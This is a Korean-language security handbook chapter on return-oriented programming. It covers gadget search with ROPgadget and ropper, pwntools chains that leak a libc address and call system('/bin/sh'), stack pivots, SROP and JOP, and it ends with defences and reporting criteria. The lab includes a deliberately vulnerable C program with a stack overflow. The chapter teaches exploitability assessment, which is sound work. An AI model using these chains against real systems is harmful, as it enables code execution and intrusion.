# ROP와 코드 재사용 (Return-Oriented Programming)

| 레벨 | 상태 | 최종 개정 | CWE |
|---|---|---|---|
| 🔴 | 🔄 개정중 | 2026-10-22 | [CWE-121](https://cwe.mitre.org/data/definitions/121.html) (연계) |

> **한눈에 보기**
> NX 때문에 주입한 코드는 실행되지 않는다. 그래서 공격자는 **이미 실행 가능한 코드**를 조각(gadget)으로 잘라 이어 붙인다.
> `ret`으로 끝나는 조각의 주소를 스택에 줄지어 놓으면 CPU가 하나씩 실행한다. 이것이 ROP이고, 완화가 켜진 바이너리에서 "오버플로가 코드 실행이 되는가"를 판단하는 기준 지식이다.
> 이 장은 취약점이 아니라 **기법**이므로 10섹션 대신 원리 → 도구 → 실습 → 변형 → 방어 순서로 간다. 취약점 자체는 [2장 스택 오버플로](02-stack-overflow.md)(CWE-121)를 전제한다.

## 1. 왜 코드 재사용인가

[7장](07-mitigations.md)에서 본 것처럼 NX는 "쓰기 가능한 페이지는 실행 불가"를 강제한다. 스택에 올린 셸코드는 실행되지 않는다. 그러나 반환 주소를 덮어 **제어 흐름을 바꾸는 능력**은 그대로다. 그 능력으로 갈 수 있는 곳은 이미 실행 가능한 코드, 즉 바이너리 자신과 libc다.

가장 단순한 형태가 **ret2libc**다. 반환 주소를 libc의 `system()`으로 바꾸고 인자로 `"/bin/sh"` 문자열의 주소를 넘긴다. 32비트 x86에서는 인자가 스택에 있으므로 반환 주소 뒤에 놓으면 됐다. 64비트에서는 첫 인자가 `rdi` 레지스터로 전달된다([1장 호출 규약](01-memory-basics.md)). 스택에 값을 놓는 것만으로는 `rdi`를 채울 수 없다. "스택에서 값을 꺼내 `rdi`에 넣고 돌아가는" 코드 조각이 필요하다.

```
 pop rdi ; ret
```

이 두 명령어가 **가젯**(gadget)이다. `ret`으로 끝나기 때문에 실행이 끝나면 스택의 다음 8바이트를 또 주소로 삼아 점프한다. 가젯 주소를 스택에 줄지어 놓으면 CPU는 연결 리스트를 따라가듯 가젯을 차례로 실행한다. 이것이 **ROP 체인**이다.

```
 스택 (낮은 주소 → 높은 주소)              실행 순서

 [ 채움 바이트 N개 ]    ← 버퍼 + 저장된 rbp   ① 취약 함수의 ret → ②로 점프
 [ pop rdi ; ret 주소 ] ← 덮인 반환 주소      ② rdi ← 다음 8바이트, ret → ③
 [ 인자 값 ]            ← rdi에 들어갈 값
 [ 호출할 함수 주소 ]                        ③ 그 함수가 rdi를 인자로 실행
```

가젯은 컴파일러가 의도해서 만든 것이 아니다. 함수 끝부분(`pop rbp; ret`), 그리고 x86 명령어가 가변 길이라 **명령어 중간**부터 디코딩하면 나오는 우연한 바이트열까지 모두 가젯이다. libc 정도 크기의 코드에는 수만 개가 있고, 레지스터 설정·메모리 읽기쓰기·시스템 호출이 다 나온다. Shacham(2007)은 이것으로 임의 계산이 가능함을 보였다.

분석가에게 ROP가 중요한 이유는 **심각도 판단** 때문이다. "스택 오버플로가 있다"는 사실만으로는 DoS인지 코드 실행인지 알 수 없다. 완화 조합([7장 8절](07-mitigations.md))과 쓸 수 있는 가젯·누출 경로를 보고 나서야 "코드 실행 가능"이라고 쓸 수 있다.

## 2. 가젯 찾기

두 도구가 표준이다. 둘 다 `pip`로 설치하며, 아래 출력은 5절의 실습 바이너리에서 실제로 얻은 것이다.

### 2.1 ROPgadget

```bash
pip install ROPgadget
ROPgadget --binary ./vuln --only "pop|ret"
```

```
Gadgets information
============================================================
0x000000000040115d : pop rbp ; ret
0x000000000040117e : pop rdi ; ret
0x000000000040101a : ret
0x000000000040105a : ret 0xffff

Unique gadgets found: 4
```

| 옵션 | 뜻 |
|---|---|
| `--only "pop\|ret"` | 이 명령어만으로 이루어진 가젯만 표시 |
| `--re "pop rdi"` | 정규식으로 검색 |
| `--depth 10` | 가젯 최대 길이(바이트, 기본 10). 늘리면 긴 가젯까지 |
| `--badbytes "0a0d"` | 주소에 이 바이트가 들어간 가젯 제외. 입력이 `fgets`로 들어오면 `0a`가 금지 바이트 |
| `--ropchain` | `execve("/bin/sh")` 체인 자동 생성 시도 (x86·x86-64) |

### 2.2 ropper

```bash
pip install ropper
ropper --nocolor --file ./vuln --search "pop rdi; ret"
```

```
0x000000000040117e: pop rdi; ret;
```

`--search`는 와일드카드(`?`)를 받는다. `--chain "execve cmd=/bin/sh"`로 체인 생성, `--badbytes 000a0d`로 금지 바이트 지정이 가능하다. 두 도구는 결과가 대체로 같고, 하나가 놓친 가젯을 다른 하나가 찾는 경우가 있어 둘 다 돌려 본다.

### 2.3 어디서 찾는가

| 대상 | 조건 | 가젯 양 |
|---|---|---|
| 바이너리 자신 | PIE가 아니면 주소 고정. PIE면 바이너리 주소 누출 필요 | 작다. 작은 프로그램에는 `pop rdi; ret`조차 없을 수 있다. glibc 2.34부터 `__libc_csu_init`이 사라져 이 가젯이 흔히 없다 |
| libc | ASLR 때문에 **libc 주소 누출** 필요 | 매우 많다. 필요한 것은 전부 있다 |
| 다른 공유 라이브러리, `ld.so` | 마찬가지로 누출 필요 | 중간 |

그래서 현실의 64비트 ROP는 보통 **2단계**다. 1단계에서 바이너리의 적은 가젯으로 libc 주소를 누출하고, 2단계에서 libc의 풍부한 가젯으로 원하는 일을 한다.

## 3. ret2plt: 누출 1단계

바이너리는 외부 함수를 PLT를 통해 호출하고, 실제 주소는 GOT에 있다([7장 6절](07-mitigations.md)). PIE가 아니면 PLT와 GOT의 주소가 고정이다. 그러면 바이너리의 `puts@plt`를 호출하면서 인자로 `GOT[puts]`의 **주소**를 넘기면, `puts`는 그 주소에 적힌 8바이트, 즉 **libc 안 `puts`의 실제 주소**를 출력한다.

```
 체인:  pop rdi ; ret  →  GOT[puts] 주소  →  puts@plt  →  main
                                                           ↑ 다시 입력을 받게 해 2단계 체인을 넣는다
```

출력된 주소에서 libc의 `puts` 오프셋을 빼면 libc 기준 주소가 나온다. 이후 `system`, `"/bin/sh"` 문자열, 모든 가젯의 주소는 `기준 주소 + 오프셋`이다. 오프셋은 **대상 시스템의 libc 파일**에서 구해야 하므로, 원격이라면 libc 버전을 알아내야 한다. 누출된 주소의 하위 12비트(페이지 안 오프셋)가 버전 식별 단서가 된다.

이 구조에서 방어자가 읽을 것은 "**출력 함수 + 고정 주소 GOT**"의 조합이 누출 프리미티브가 된다는 점이다. PIE 하나로 1단계가 막히고, Full RELRO는 GOT 덮어쓰기를 막지만 GOT **읽기**는 막지 못한다.

## 4. pwntools ROP 클래스

손으로 주소를 패킹하는 대신 pwntools의 `ROP` 클래스를 쓴다. 가젯 검색, 인자 배치를 알아서 한다. 아래는 5절 바이너리에서 실제로 얻은 출력이다.

```python
from pwn import *
context.binary = elf = ELF('./vuln')   # 아키텍처·엔디안 자동 설정

rop = ROP(elf)
rop.call('puts', [elf.got['puts']])    # puts(GOT[puts]) : 3절의 누출 체인
rop.call('main')                       # 다시 main으로
print(rop.dump())
```

```
0x0000:         0x40117e pop rdi; ret
0x0008:         0x404000 [arg0] rdi = got.puts
0x0010:         0x401064 puts
0x0018:         0x4011b4 main()
```

`rop.dump()`는 체인을 사람이 읽는 표로, `rop.chain()`은 바이트열로 준다. 자주 쓰는 API는 다음과 같다.

| API | 뜻 |
|---|---|
| `ROP(elf)` / `ROP([elf, libc])` | 가젯을 찾을 바이너리. 여러 개를 주면 합쳐 찾는다. `libc.address`를 설정해 두면 그 기준 주소로 계산한다 |
| `rop.call(func, [args])` | 함수 호출. `func`는 심볼 이름 또는 주소. 인자 레지스터(`rdi, rsi, rdx, ...`)를 채우는 가젯을 자동 선택 |
| `rop.puts(addr)` | `rop.call('puts', [addr])`의 축약 |
| `rop.raw(value)` | 8바이트 값이나 가젯을 그대로 추가. 정렬용 `ret`, 더미 값에 쓴다 |
| `rop.find_gadget(['pop rdi', 'ret'])` | 가젯 검색. `.address`로 주소. 없으면 `None` |
| `rop.chain()` / `rop.dump()` | 바이트열 / 사람이 읽는 표 |
| `rop.migrate(addr)` | 스택 피벗(6절) 체인 생성 |
| `elf.plt['puts']`, `elf.got['puts']`, `elf.symbols['main']` | PLT·GOT·심볼 주소 |
| `libc.search(b'/bin/sh\x00')` | 문자열 검색 제너레이터. `next()`로 첫 주소 |
| `cyclic(200)`, `cyclic_find(value)` | 오프셋 찾기용 패턴 생성·역산 |
| `SigreturnFrame()` | SROP(7절)용 시그널 프레임 객체 |

`rop.call`이 `Could not satisfy setRegisters({'rdi': ...})` 오류를 내면 그 바이너리에 `rdi`를 채울 가젯이 없다는 뜻이다. 2.3절의 "작은 바이너리에는 가젯이 없다"가 이렇게 나타나며, libc 누출 뒤 `ROP(libc)`로 넘어가야 한다.

## 5. 실습 🧪

gcc와 pwntools만으로 한다. 환경은 [1부 5장](../part1-foundations/05-lab-setup.md). 목표는 "체인을 설계하고 도구 출력으로 검증하는 과정"을 익히는 것이다. 카나리와 PIE를 끄고 NX·ASLR은 켠 채로 둔다. 실제 바이너리에는 보통 `pop rdi; ret` 가젯이 없으므로 실습용으로 하나 넣는다.

```c
/* vuln.c */
#include <stdio.h>
#include <unistd.h>

/* 실습용 가젯. 실제 대상에서는 libc 등 큰 코드에서 찾는다 */
void gadget(void) { __asm__ volatile("pop %rdi; ret"); }

void vuln(void) {
    char buf[64];
    read(0, buf, 256);          /* ❌ 취약: 64바이트 버퍼에 256바이트 */
    puts(buf);
}

int main(void) {
    setvbuf(stdout, NULL, _IONBF, 0);
    puts("input:");
    vuln();
    return 0;
}
```

```bash
gcc -fno-stack-protector -no-pie -g -w vuln.c -o vuln
pip install pwntools ROPgadget
pwn checksec ./vuln
#   RELRO: Partial RELRO   Stack: No canary found   NX: NX enabled   PIE: No PIE (0x400000)
cat /proc/sys/kernel/randomize_va_space    # 2 = ASLR 켜짐
```

### 5.1 단계

1. **완화 읽기.** `pwn checksec` 결과를 [7장 8절](07-mitigations.md) 표에 대응시킨다. NX 있음·카나리 없음·PIE 없음이므로 "바이너리 가젯 + libc 누출" 경로다.
2. **가젯 목록.** 2절의 두 명령으로 `pop rdi; ret`(`0x40117e`)과 `ret`(`0x40101a`)을 확인한다.
3. **오프셋.** 반환 주소까지 몇 바이트인지 `cyclic` 패턴으로 잰다.
   ```python
   from pwn import *
   context.binary = './vuln'
   p = process('./vuln'); p.recvline()
   p.send(cyclic(200)); p.wait()
   core = p.corefile
   print("offset:", cyclic_find(core.read(core.rsp, 4)))   # offset: 72
   ```
   `buf[64]` + 저장된 `rbp` 8바이트 = 72. 코어 덤프가 생기지 않으면 `ulimit -c unlimited`를 먼저 한다. gdb+pwndbg로 하는 방법은 [6부 3장](../part6-tools/03-debuggers.md)에 있다.
4. **1단계 체인 설계.** 4절 코드로 누출 체인을 만들고 `rop.dump()`가 3절의 그림과 같은지 확인한다. 이 체인을 72바이트 채움 뒤에 붙여 보내면 `puts`의 libc 주소가 출력되고 프로그램이 `main`으로 돌아와 다시 입력을 기다린다.
5. **2단계 체인 설계.** 누출 값에서 `libc.symbols['puts']`를 빼 `libc.address`를 설정하고, `ROP(libc)`로 `system("/bin/sh")` 호출 체인을 만들어 `rop.dump()`로 확인한다. 두 번 실행해 libc 기준 주소가 매번 다른 것을 보면 [7장 4절](07-mitigations.md) "ASLR 우회 = 주소 하나 누출"이 실물로 보인다.
6. **정렬.** 2단계 체인 앞에 `ret` 가젯 하나를 `rop.raw()`로 넣는다. 빼고 실행하면 `system` 내부의 `movaps` 명령이 스택 16바이트 정렬을 요구해 SIGSEGV가 난다. 64비트 ROP에서 가장 흔한 "왜 안 되지"의 원인이다.

### 5.2 더 해 보기

- `gcc -fstack-protector-strong`을 켜고 같은 입력이 `*** stack smashing detected ***`로 막히는 것을 본다. [3장 포맷 스트링](03-format-string.md)의 `%p` 누출 같은 추가 프리미티브가 왜 필요한지 체감된다.
- `-pie`를 켜고 1단계 체인이 왜 성립하지 않는지(`elf.got['puts']`가 고정 주소가 아님) 확인한다.
- 공개 실습: [ROP Emporium](https://ropemporium.com/)은 `ret2win → split → callme → write4 → badchars → fluff → pivot` 순서로 이 장의 개념을 하나씩 다루는 전용 연습 바이너리를 제공한다. [pwn.college](https://pwn.college/)에도 ROP 모듈이 있다.

## 6. 스택 피벗

입력 버퍼가 작아 체인 전체가 반환 주소 뒤에 들어가지 않을 때, 또는 덮을 수 있는 것이 반환 주소 한 칸뿐일 때 쓴다. 체인을 **다른 곳**(힙, 전역 버퍼, 더 큰 입력 버퍼)에 써 두고, `rsp`를 그곳으로 옮기는 가젯 하나만 반환 주소에 놓는다.

| 피벗 가젯 | 효과 |
|---|---|
| `pop rsp ; ret` | 가장 직접적. 드물다 |
| `leave ; ret` | `mov rsp, rbp ; pop rbp ; ret`. 저장된 `rbp`를 덮을 수 있으면 거의 항상 가능하다. 함수 에필로그마다 있다 |
| `xchg rax, rsp ; ret` 등 | `rax`에 주소를 넣을 수 있을 때 |
| `add rsp, N ; ret` | 체인이 조금 떨어진 곳에 있을 때 `rsp`를 그만큼 건너뛴다 |

pwntools의 `rop.migrate(addr)`가 쓸 수 있는 피벗 가젯을 골라 체인을 만든다. 피벗 후에는 새 스택이 가리키는 메모리가 **쓰기 가능하고 주소를 아는** 곳이어야 하므로, PIE가 아닌 바이너리의 `.bss`가 흔한 선택지다.

## 7. SROP와 JOP 🔴

**SROP**(Sigreturn-Oriented Programming)는 가젯이 거의 없을 때 쓴다. 커널은 시그널 핸들러에서 돌아올 때 `sigreturn` 시스템 호출로 **스택에 저장된 레지스터 전체**를 복원한다. 공격자가 스택에 가짜 시그널 프레임(모든 레지스터 값)을 놓고 `sigreturn`을 호출하면, 가젯 없이 `rax, rdi, rsi, rdx, rip, rsp`를 한 번에 원하는 값으로 만들 수 있다. 필요한 것은 `syscall; ret` 가젯과 `rax = 15`(x86-64의 `sigreturn` 번호)를 만들 방법뿐이다. pwntools의 `SigreturnFrame()`이 프레임 레이아웃을 대신 채운다(`frame.rax = constants.SYS_execve` 식으로 필드를 지정하고 `bytes(frame)`으로 직렬화). 정적 링크된 작은 바이너리와 임베디드 환경에서 자주 쓰인다.

**JOP**(Jump-Oriented Programming)는 `ret` 대신 `jmp reg`·`call reg`로 끝나는 가젯을 잇는다. 반환 주소를 검사하는 섀도 스택([7장 7.2절](07-mitigations.md))을 피하기 위한 것으로, 각 가젯이 끝나면 **디스패처** 가젯(예: `add rsi, 8 ; jmp [rsi]`)으로 돌아가 다음 가젯 주소를 읽는다. 체인이 스택이 아니라 임의 메모리에 있고, 가젯 사이의 연결이 레지스터로 유지되므로 설계가 ROP보다 까다롭다. IBT(`endbr64` 검사)가 켜진 환경에서는 가젯이 함수 시작 지점으로 제한된다.

| 기법 | 체인 연결 수단 | 필요한 것 | 막는 완화 |
|---|---|---|---|
| ROP | `ret` + 스택 | `ret`으로 끝나는 가젯, 스택 제어 | 섀도 스택, PAC |
| ret2libc | `ret` 한 번 | 함수 주소, 인자 설정 가젯 | 섀도 스택, 주소 비밀(ASLR) |
| SROP | `sigreturn` | `syscall` 가젯, `rax` 제어 | 섀도 스택(일부), 시스템 호출 필터(seccomp) |
| JOP | `jmp`/`call reg` + 디스패처 | 간접 점프 가젯, 레지스터 제어 | IBT, CFI, PAC |

## 8. 방어와 보고 관점

ROP 자체를 "고치는" 패치는 없다. 막는 것은 두 층이다.

| 계층 | 조치 | 효과 |
|---|---|---|
| 코드 | 전제가 되는 메모리 손상 제거 ([2장](02-stack-overflow.md), [4장](04-heap.md), [5장](05-uaf.md), [6장](06-integer-overflow.md)) | 근본 제거 |
| 빌드 | `-fstack-protector-strong`, `-fPIE -pie`, `-Wl,-z,relro,-z,now`, `-fcf-protection` | 체인 구성에 필요한 조건(고정 주소, 반환 주소 덮기)을 하나씩 뺏는다 |
| 하드웨어 | CET 섀도 스택·IBT, ARM PAC | `ret`·간접 점프 기반 체인을 원천 거부 |
| 인프라 | seccomp 시스템 호출 필터, 컨테이너 권한 축소 | 체인이 성공해도 `execve`가 막히면 영향이 줄어든다 |
| 탐지 | 크래시 로그의 `rip`가 가젯 주소(함수 중간)인지, 스택에 연속된 코드 주소가 있는지 | 사후 분석에서 ROP 시도 식별 |

보고서에는 다음을 적는다. (1) 완화 조합(`checksec` 출력), (2) 제어 흐름 탈취 가능 여부(`rip`를 덮었는가), (3) 누출 경로의 유무, (4) 쓸 수 있는 가젯의 출처(바이너리/libc). 네 가지가 모두 있으면 "코드 실행 가능"이고, 하나라도 빠지면 그 조건을 명시한 채 "조건부 코드 실행" 또는 "DoS"로 쓴다. [8부 2장 영향도 산정](../part8-reporting/02-severity.md)의 익스플로잇 가능성 항목이 이 네 가지다.

## 체크리스트

**분석할 때**
- [ ] `checksec` 결과를 [7장 8절](07-mitigations.md) 표와 대응시켰는가?
- [ ] `rip`(반환 주소 또는 함수 포인터)를 덮을 수 있음을 디버거로 확인했는가?
- [ ] 가젯 출처가 바이너리인가 libc인가? libc라면 누출 경로가 있는가?
- [ ] 금지 바이트(`\x00`, `\x0a` 등)를 `--badbytes`로 걸러 가젯을 골랐는가?
- [ ] 64비트 체인에서 `system`/`printf` 호출 전 스택 16바이트 정렬을 넣었는가?
- [ ] 가젯이 없을 때 SROP·피벗·JOP 중 어느 것이 조건에 맞는지 검토했는가?

**보고할 때**
- [ ] 완화 조합, 탈취 여부, 누출 경로, 가젯 출처 네 가지를 적었는가?
- [ ] 실제 셸 획득은 허가 범위 안의 실습 환경에서만 했는가? ([1부 4장](../part1-foundations/04-ethics-and-law.md))

## 더 읽기

- Hovav Shacham, "The Geometry of Innocent Flesh on the Bone: Return-into-libc without Function Calls (on the x86)", CCS 2007 · ROP의 원 논문. 가젯과 튜링 완전성
- Erik Bosman, Herbert Bos, "Framing Signals: A Return to Portable Shellcode", IEEE S&P 2014 · SROP의 원 논문
- [pwntools ROP 모듈 문서](https://docs.pwntools.com/en/stable/rop/rop.html), [SROP 문서](https://docs.pwntools.com/en/stable/rop/srop.html) · `ROP`, `SigreturnFrame` API
- [ROPgadget](https://github.com/JonathanSalwan/ROPgadget), [ropper](https://github.com/sashs/Ropper) · 옵션 전체 목록
- [ROP Emporium](https://ropemporium.com/) · 개념별 연습 바이너리와 풀이 가이드
- [7장 완화 기법과 우회](07-mitigations.md) · 각 완화가 ROP의 어느 단계를 막는가

## 변경 이력

| 날짜 | 변경 | 기여자 |
|---|---|---|
| 2026-10-21 | 초안(뼈대) 작성 | @anthonynoh5202 |
| 2026-10-22 | 본문 8절 작성. ROPgadget·ropper·pwntools 출력 로컬 검증 | @anthonynoh5202 |
